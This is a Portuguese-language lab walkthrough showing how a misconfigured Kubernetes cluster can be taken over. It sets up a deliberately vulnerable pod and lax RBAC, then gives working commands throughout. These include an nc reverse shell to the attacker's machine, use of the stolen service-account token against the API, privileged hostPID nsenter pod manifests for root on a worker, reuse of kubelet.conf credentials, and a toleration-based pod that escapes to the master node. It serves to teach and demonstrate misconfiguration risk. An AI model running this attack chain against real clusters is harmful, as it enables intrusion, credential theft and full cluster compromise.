# Kubernetes é seguro por default ou à prova de má configuração?

# Lab + explicação:

Para montar nosso lab vamos precisar de um cluster kubernetes, pode ser até no kind ou minikube.

**Não executar esse lab em um cluster produtivo** 

Primeiro vamos criar nosso namespace, pod, service account e roles:

```
kubectl create ns production

kubectl create sa web-app-sa -n production

kubectl create role web-app-role -n production --verb=get,list,create --resource=pods,pods/exec

kubectl create rolebinding binding-role-app --serviceaccount=production:web-app-sa --role=web-app-role -n production

kubectl run web-app --image=p0ssuidao/vulne-pod-lab:01 --serviceaccount=web-app-sa -n production

kubectl expose pod -n production web-app --port=8080 --target-port=8080 --type=NodePort --name=web-app-role

```

```
kubectl get no -o wide 
kubectl get svc -n production 
```
Agora basta acessar no seu navegador IP do node + Node port

User foo 
Pass bar

Agora vamos abrir a porta 32000 para receber a conexão:
```
sudo nc  -l 32000
```

Executar no terminal remoto para ganhar acesso a shell:
```
nc -e /bin/bash "IP da sua maquina" 32000
```

Primeiro identificarmos com qual usuário estamos logados:
```
id
```
A aplicação está rodando com o usuário appuser, então vamos ver quais processos estão em execução.

```
ps aux
```

Existe um número muito baixo de processos. Ter poucos processos é o primeiro indicativo que a aplicação é em um container. Por default um container roda com o usuário root mas isso pode ser alterado.
Levantaremos informações sobre o release do S.O.
```
uname -a ; cat /etc/*-release
```

Aqui há informações como a linha da distribuição GNU/Linux e versão do Kernel. Com isso já pode se iniciar a busca por exploits para a versão de kernel e baseados na distro.
Continuando a busca, listaremos as variáveis de ambiente.

```
env
```

Vamos continuar o reconhecimento para termos certeza que estamos rodando em um container. Para isso vamos utilizar a ferramenta “amicontained”, pois com ela conseguimos uma serie de informações como:

- Container Runtime.
- Existência de namespace.
- Capabilities.
- Syscalls liberadas.

```
cd /tmp; curl -fSL "https://github.com/genuinetools/amicontained/releases/download/v0.4.9/amicontained-linux-amd64" -o "amicontained" \
 && chmod a+x "amicontained" \
 && ./amicontained
```

Todo pod, deploy e rs possui uma serviceaccount e por padrão são executados com a conta default. Uma serviceaccount fornece uma identidade para processos executados em um pod e nela são atrelado as rules de permissão.
As chaves e certificados ficam em um volume montado no pod.

```
cd /var/run/secrets/kubernetes.io/serviceaccount
```

Primeiro vamos ver a versão do cluster e se conseguimos interagir com a API.
```
curl -k https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}/version
```

Já que conseguimos acesso a API com esse token vamos tentar listar alguns pods, de inicio vamos tentar listar no namespace em que estamos:
```
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)

curl -k https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}/api --header "Authorization: Bearer $TOKEN" --insecure

curl -k https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}/api/v1/namespaces/$NS/pods/ --header "Authorization: Bearer $TOKEN" --insecure
```
Conseguimos listar os pods e isso é muito interessante. Para facilitar um pouco as coisas vamos baixar o kubectl para interagir com o cluster.
```
cd /tmp ; curl -LO https://storage.googleapis.com/kubernetes-release/release/v1.18.0/bin/linux/amd64/kubectl ; chmod +x ./kubectl
```
Listaremos os pods com o kubectl.
```
./kubectl get pod
```
Para testar nossos acessos vamos utilizar o "kubectl auth can-i"
```
./kubectl auth can-i --list

./kubectl auth can-i create pods
```

Agora vamos tentar escalar nosso privilegio sem utilizar nenhum exploit apenas conhecimento da ferramenta.

```
cd /tmp; cat > root-shell.yml <<EOF
apiVersion: v1
kind: Pod
metadata:
  labels:
    run: root-shell
  name: root-shell
spec:
  containers:
  - command:
    - nsenter
    - --mount=/proc/1/ns/mnt
    - --
    - /bin/bash
    image: alpine
    imagePullPolicy: IfNotPresent
    name: "root-shell"
    securityContext:
      privileged: true
    stdin: true
    tty: true
  dnsPolicy: ClusterFirst
  hostPID: true
EOF
./kubectl apply -f root-shell.yml
sleep 10
./kubectl get pods
sleep 10
./kubectl exec -it root-shell -- bash

```
Conseguimos acesso uma máquina !  

Verificando os acessos: 

```
id

ps aux

docker ps

cat /etc/hostname

```
Nosso acesso é a um worker mas queremos chegar nos master, para isso será necessário informações sobre os demais nodes.

Como vimos nossa conta não possui permissão para listar os nodes, então vamos procurar um conta que consiga listar os nodes.
Lembrando dos componentes que fazem parte do node o kubelet possui permissão para verificar os nós ativos, vamos tentar utilizar sua configuração de autenticação para listarmos os nodes:

Vamos pegar suas config com:

```
systemctl status kubelet
```

Com a config do kubelet tentaremos listar os nodes usando o parametro --kubeconfig:

```
kubectl get no --kubeconfig=/etc/kubernetes/kubelet.conf
```

Conseguimos ! 

Agora vamos forçar o scheduler nos agendar no node master.
Mas primeiro precisamos voltar para nosso container com permissão de criação de pods.

```
exit
```

- **Nome do node Master** | Substituir pelo nome do seu nó em yml abaixo.

```
cd /tmp; cat > master-root-shell.yml <<EOF
apiVersion: v1
kind: Pod
metadata:
  labels:
    run: master-root-shell
  name: master-root-shell
spec:
  containers:
  - command:
    - nsenter
    - --mount=/proc/1/ns/mnt
    - --
    - /bin/bash
    image: alpine
    imagePullPolicy: IfNotPresent
    name: "master-root-shell"
    securityContext:
      privileged: true
    stdin: true
    tty: true
  dnsPolicy: ClusterFirst
  hostPID: true
  nodeName: *Nome do node Master* 
  tolerations:
  - effect: NoExecute
    operator: Exists
EOF
./kubectl apply -f master-root-shell.yml
sleep 10
./kubectl get pods
sleep 10
./kubectl exec -it master-root-shell -- bash
```

Conseguimos acesso ao master =)
```
id

ps aux

docker ps

kubectl get no

kubectl auth can-i --list
``` 
